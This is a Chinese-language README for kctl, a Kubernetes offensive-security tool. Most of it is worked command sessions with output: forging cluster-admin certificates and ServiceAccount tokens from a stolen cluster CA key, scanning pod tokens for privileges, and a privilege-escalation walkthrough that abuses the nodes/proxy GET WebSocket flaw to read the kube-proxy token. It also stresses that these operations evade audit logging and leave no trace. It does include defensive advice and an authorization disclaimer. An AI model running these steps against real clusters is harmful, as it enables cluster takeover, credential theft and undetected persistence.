<p align="center">
  <img src="https://img.shields.io/github/v/release/kinopio1101/kctl?color=%2300ADD8&label=release&logo=github&logoColor=white" alt="GitHub Release">
  <img src="https://img.shields.io/badge/Go-1.24+-00ADD8?logo=go&logoColor=white" alt="Go Version">
  <a href="https://github.com/kinopio1101/kctl/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-E11311.svg" alt="MIT License">
  </a>
  <a href="https://github.com/kinopio1101/kctl/issues">
    <img src="https://img.shields.io/github/issues/kinopio1101/kctl?color=%23F97316&logo=github" alt="GitHub Issues">
  </a>
  <a href="https://github.com/kinopio1101/kctl/stargazers">
    <img src="https://img.shields.io/github/stars/kinopio1101/kctl?color=%23FBBF24&logo=github" alt="GitHub Stars">
  </a>
</p>

<p align="center">
  <a href="./README.md"><img alt="README in English" src="https://img.shields.io/badge/English-d9d9d9"></a>
  <a href="./README.zh-CN.md"><img alt="简体中文版自述文件" src="https://img.shields.io/badge/简体中文-d9d9d9"></a>
</p>

<h1 align="center">kctl</h1>

<h4 align="center">Kubernetes 安全审计工具 - 渗透测试与横向移动</h4>

<p align="center">
  <a href="#功能概览">功能概览</a> •
  <a href="#快速开始">快速开始</a> •
  <a href="#运行模式">运行模式</a> •
  <a href="#golden-ticket">Golden Ticket</a> •
  <a href="#控制台命令">命令</a> •
  <a href="#实战案例nodesproxy-权限提权">攻击案例</a> •
  <a href="#防御建议">防御</a>
</p>

---

## 功能概览

kctl 是一个 Kubernetes 安全审计工具，专为渗透测试设计。支持两种运行模式：

- **Kubelet 模式** - 直接访问 Kubelet API (10250) 进行节点级操作
- **Kubernetes 模式** - 通过 API Server (6443) 进行集群操作，包括 Golden Ticket 攻击

### 功能列表

| 功能 | 模式 | 说明 |
|------|------|------|
| `discover` | Kubelet | 扫描网段发现 Kubelet 节点 |
| `sa scan` | Kubelet | 扫描所有 Pod 的 SA Token 权限 |
| `exec` | Kubelet | 通过 Kubelet API 在 Pod 中执行命令 |
| `run` | Kubelet | 通过 /run API 执行命令 |
| `portforward` | Kubelet | 通过 Kubelet API 端口转发 |
| `pid2pod` | Kubelet | 将 PID 映射到 Pod 元数据 |
| `golden` | Kubernetes | 伪造证书和 SA Token (Golden Ticket) |

## 快速开始

### 基本使用

```bash
# 进入交互式控制台
./kctl console

# 指定目标进入
./kctl console -t 10.0.0.1

# 完整连接参数
./kctl console -t 10.0.0.1 -p 10250 --token "eyJ..." --api-server 10.0.0.1 --api-port 6443

# 使用代理
./kctl console -t 10.0.0.1 --proxy socks5://127.0.0.1:1080
```

### Pod 内自动检测

在 Pod 内运行时，kctl 会自动：
1. 检测 Kubelet IP（默认网关）
2. 读取 ServiceAccount Token
3. 连接到 Kubelet
4. 检查当前 SA 的权限

```
$ ./kctl console

    ██╗  ██╗ ██████╗████████╗██╗
    ██║ ██╔╝██╔════╝╚══██╔══╝██║
    █████╔╝ ██║        ██║   ██║
    ██╔═██╗ ██║        ██║   ██║
    ██║  ██╗╚██████╗   ██║   ███████╗
    ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝

  Kubernetes Security Audit Tool

  [*] Mode: kubelet (In-Pod)
  [*] Kubelet: 10.244.1.1:10250 (auto-detected)
  [*] Type 'help' for available commands

[*] Auto-connecting to Kubelet 10.244.1.1:10250...
✓ Connected successfully
[+] Using ServiceAccount: default/attacker
[*] Checking permissions...
[+] Risk Level: CRITICAL

kctl [kubelet:10.244.1.1:10250 default/attacker CRITICAL]>
```

## 运行模式

kctl 支持两种运行模式，不同模式下可用的命令不同：

### Kubelet 模式（默认）

用于直接操作单个节点的 Kubelet API：

```
kctl [kubelet:10.0.0.1:10250]> help

  可用命令 [kubelet]

  连接:
    connect      连接到 Kubelet
    discover     扫描网段发现 Kubelet 节点

  信息收集:
    pods         列出节点上的 Pod
    sa           ServiceAccount 操作

  执行:
    exec         执行命令 (WebSocket)
    run          执行命令 (/run API)
    portforward  端口转发
    pid2pod      PID 映射到 Pod
```

### Kubernetes 模式

用于 API Server 操作，包括 Golden Ticket 攻击：

```
kctl [kubelet]> mode kubernetes
[+] Switched to kubernetes mode

kctl [kubernetes:127.0.0.1:6443]> help

  可用命令 [kubernetes]

  Golden Ticket:
    golden       伪造证书和 SA Token

  配置:
    set          设置配置项
    show         显示信息
```

使用 `mode kubelet` 或 `mode kubernetes` 切换模式。

## Golden Ticket

Golden Ticket 功能允许在获取集群 CA 密钥后伪造 Kubernetes 证书和 ServiceAccount Token，实现持久化访问。

### 前置条件

使用 Golden Ticket 需要获取以下文件：
- **CA 证书和私钥** (`ca.crt`, `ca.key`) - 用于伪造用户/节点证书
- **SA 签名密钥** (`sa.key`) - 用于伪造 ServiceAccount Token

这些文件通常位于控制平面节点的 `/etc/kubernetes/pki/` 目录。

### 伪造用户证书 (cluster-admin)

```bash
# 切换到 kubernetes 模式
kctl> mode kubernetes

# 设置 API Server
kctl [kubernetes]> set api-server 10.0.0.1
kctl [kubernetes]> set api-port 6443

# 伪造管理员证书
kctl [kubernetes:10.0.0.1:6443]> golden user-cert --ca-cert ca.crt --ca-key ca.key --role system:masters --user admin

[*] Using API Server: https://10.0.0.1:6443
[*] Creating user certificate (system:masters/admin)...

[+] Successfully created user certificate!

  Certificate: system-masters_admin.crt
  Private key: system-masters_admin.key
  Kubeconfig:  kubeconfig_system-masters_admin

  Test with: kubectl --kubeconfig=kubeconfig_system-masters_admin auth whoami

[*] Identity: admin (role: system:masters)
[*] Expires at: 2027-02-10 16:30:19
```

### 伪造 ServiceAccount Token

```bash
# 首先从 API Server 获取 UID 缓存
kctl [kubernetes:10.0.0.1:6443]> golden update-uid --ca-cert ca.crt --ca-key ca.key

[*] Using API Server: https://10.0.0.1:6443
[*] Creating temporary admin certificate...
[*] Requesting ServiceAccount list...

[+] Received 45 ServiceAccounts
[+] UID cache saved to memory

# 列出缓存的 UID
kctl [kubernetes:10.0.0.1:6443]> golden uid-list
kctl [kubernetes:10.0.0.1:6443]> golden uid-list -n kube-system

# 伪造 Token（自动从内存查找 UID）
kctl [kubernetes:10.0.0.1:6443]> golden sa-token --sa-key sa.key --namespace kube-system --name default

[+] Found UID in memory cache: a1b2c3d4-...
[*] Forging ServiceAccount token (TTL: 3600s)...

[+] Forged ServiceAccount token for kube-system/default:

  Token: eyJhbGciOiJSUzI1NiIs...

[+] Kubeconfig: kubeconfig_kube-system_default
```

### Golden Ticket 子命令

| 命令 | 说明 |
|------|------|
| `golden user-cert` | 伪造用户证书（如 cluster-admin） |
| `golden node-cert` | 伪造节点证书（模拟 kubelet） |
| `golden sa-token` | 伪造 ServiceAccount JWT Token |
| `golden update-uid` | 从 API Server 获取 SA UID 到内存 |
| `golden uid-list` | 列出缓存的 UID |
| `golden test` | 验证密钥文件 |

## 控制台命令

### 通用命令（所有模式）

| 命令 | 说明 |
|------|------|
| `help` | 显示帮助信息 |
| `mode` | 查看或切换运行模式 |
| `set <key> <value>` | 设置配置项 |
| `show options` | 显示当前配置 |
| `show status` | 显示会话状态 |
| `export json/csv` | 导出扫描结果 |
| `clear` | 清除缓存 |
| `exit` | 退出控制台 |

### Kubelet 模式命令

| 命令 | 说明 |
|------|------|
| `discover <target>` | 扫描网段发现 Kubelet 节点 |
| `connect [ip]` | 连接到 Kubelet |
| `pods` | 列出节点上的 Pod |
| `sa scan` | 扫描所有 Pod 的 SA 权限 |
| `sa list` | 列出已扫描的 SA |
| `sa use <ns/name>` | 切换到指定的 SA |
| `sa info` | 显示当前 SA 详情 |
| `exec` | 在 Pod 中执行命令（WebSocket） |
| `run` | 在 Pod 中执行命令（/run API） |
| `portforward` | 端口转发到 Pod |
| `pid2pod` | 将 PID 映射到 Pod（仅 Pod 内） |

### Kubernetes 模式命令

| 命令 | 说明 |
|------|------|
| `golden user-cert` | 伪造用户证书 |
| `golden node-cert` | 伪造节点证书 |
| `golden sa-token` | 伪造 ServiceAccount Token |
| `golden update-uid` | 获取 SA UID 到内存 |
| `golden uid-list` | 列出缓存的 UID |
| `golden test` | 验证密钥文件 |

### 典型工作流程（Kubelet 模式）

```bash
# 1. 扫描网段发现 Kubelet 节点
kctl [kubelet]> discover 10.0.0.0/24

# 2. 选择目标
kctl [kubelet]> set target 10.0.0.5

# 3. 扫描节点上所有 Pod 的 SA 权限
kctl [kubelet:10.0.0.5:10250]> sa scan

# 4. 查看高权限 SA
kctl [kubelet:10.0.0.5:10250]> sa list --admin

# 5. 切换到高权限 SA
kctl [kubelet:10.0.0.5:10250]> sa use kube-system/cluster-admin

# 6. 使用新身份执行命令
kctl [kubelet:10.0.0.5:10250 kube-system/cluster-admin ADMIN]> exec -it
```

### 典型工作流程（Golden Ticket）

```bash
# 1. 切换到 kubernetes 模式
kctl [kubelet]> mode kubernetes

# 2. 设置 API Server
kctl [kubernetes]> set api-server 10.0.0.1
kctl [kubernetes]> set api-port 6443

# 3. 伪造管理员证书（需要 ca.crt 和 ca.key）
kctl [kubernetes:10.0.0.1:6443]> golden user-cert -c ca.crt -k ca.key --role system:masters

# 4. 测试伪造的证书
$ kubectl --kubeconfig=kubeconfig_system-masters_kubernetes-admin get nodes

# 5. 伪造 SA Token 前先获取 UID
kctl [kubernetes:10.0.0.1:6443]> golden update-uid -c ca.crt -k ca.key

# 6. 伪造 SA Token（需要 sa.key）
kctl [kubernetes:10.0.0.1:6443]> golden sa-token -s sa.key --namespace kube-system --name default
```

## 实战案例：nodes/proxy 权限提权

### 背景

`nodes/proxy GET` 权限是一个常见但危险的权限，许多监控工具（如 Prometheus、Datadog、Grafana）都需要此权限来收集指标。

根据 [Graham Helton 的研究](https://grahamhelton.com/blog/nodes-proxy-rce)，由于 Kubelet 在处理 WebSocket 连接时的授权缺陷，`nodes/proxy GET` 权限实际上可以用于在任意 Pod 中执行命令。

### 漏洞原理

1. WebSocket 协议要求使用 HTTP GET 进行初始握手
2. Kubelet 基于初始 HTTP 方法（GET）进行授权检查
3. 授权通过后，WebSocket 连接可以访问 `/exec` 端点执行命令
4. 这绕过了本应需要的 `nodes/proxy CREATE` 权限

### 使用 kctl 进行提权

#### 步骤 1：进入控制台并检查权限

```bash
# 将 kctl 复制到目标 Pod
kubectl cp kctl-linux-amd64 attacker:/kctl

# 进入 Pod
kubectl exec -it attacker -- /bin/sh

# 运行 kctl
/kctl console
```

```
[*] Auto-connecting to Kubelet 10.244.1.1:10250...
✓ Connected successfully
[+] Using ServiceAccount: default/attacker
[*] Checking permissions...
[+] Risk Level: HIGH

kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]>
```

#### 步骤 2：扫描节点上的所有 Pod

```
kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]> sa scan

[*] Scanning ServiceAccount tokens...
[*] Found 15 pods with SA tokens
[*] Checking permissions... (3 concurrent)

RISK     NAMESPACE      POD                    SERVICE ACCOUNT      TOKEN    FLAGS
─────────────────────────────────────────────────────────────────────────────────
ADMIN    kube-system    kube-proxy-xxxxx       kube-proxy           Valid    -
ADMIN    kube-system    coredns-xxxxx          coredns              Valid    -
HIGH     monitoring     prometheus-xxxxx       prometheus           Valid    -
...

[+] Scan complete: 15 SAs, 2 ADMIN, 1 CRITICAL, 3 HIGH
```

#### 步骤 3：利用 nodes/proxy 执行命令

```
kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]> exec -n kube-system kube-proxy-xxxxx -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

这会返回 `kube-proxy` 的 ServiceAccount Token，该 Token 通常具有 cluster-admin 权限！

#### 步骤 4：切换到高权限身份

```
kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]> sa use kube-system/kube-proxy

[+] Switched to kube-system/kube-proxy
[*] Checking permissions...
[!] Risk Level: ADMIN (cluster-admin)

kctl [kubelet:10.244.1.1:10250 kube-system/kube-proxy ADMIN]>
```

现在你拥有了 cluster-admin 权限，可以使用该 token 对集群进行完全控制。

## 风险等级说明

| 等级 | 说明 | 示例权限 |
|------|------|----------|
| ADMIN | 集群管理员 | `*/*`、cluster-admin |
| CRITICAL | 可直接提权 | `secrets:create`、`pods/exec:create` |
| HIGH | 可泄露敏感信息 | `secrets:get`、`nodes/proxy:get` |
| MEDIUM | 可能被滥用 | `pods:create`、`configmaps:get` |
| LOW | 低风险 | `pods:list`、`services:get` |
| NONE | 无风险 | 只读基础权限 |

## 防御建议

1. **避免授予 nodes/proxy 权限** - 使用 KEP-2862 提供的细粒度权限（如 `nodes/metrics`、`nodes/stats`）
2. **网络隔离** - 限制对 Kubelet 端口（10250）的访问
3. **审计日志** - 注意：直接访问 Kubelet API 不会生成 pods/exec 审计日志
4. **最小权限原则** - 定期审查 ServiceAccount 权限
5. **保护 CA 密钥** - 严格限制对 `/etc/kubernetes/pki/` 目录的访问

## 注意事项

- 本工具仅用于合法的安全评估和渗透测试
- 使用前请确保已获得适当的授权
- 所有操作都在内存中进行，退出后不留痕迹
- 直接访问 Kubelet API 的操作不会被 Kubernetes 审计日志记录
- Golden Ticket 攻击需要事先获取集群 CA/SA 密钥

## 参考资料

- [Kubernetes Remote Code Execution Via Nodes/Proxy GET Permission](https://grahamhelton.com/blog/nodes-proxy-rce)
- [k8s_spoofilizer - Kubernetes Golden Ticket](https://github.com/jtesta/k8s_spoofilizer)
- [KEP-2862: Fine-Grained Kubelet API Authorization](https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/2862-fine-grained-kubelet-authz/README.md)
- [Kubelet Authentication/Authorization](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/)

## 许可证

MIT License
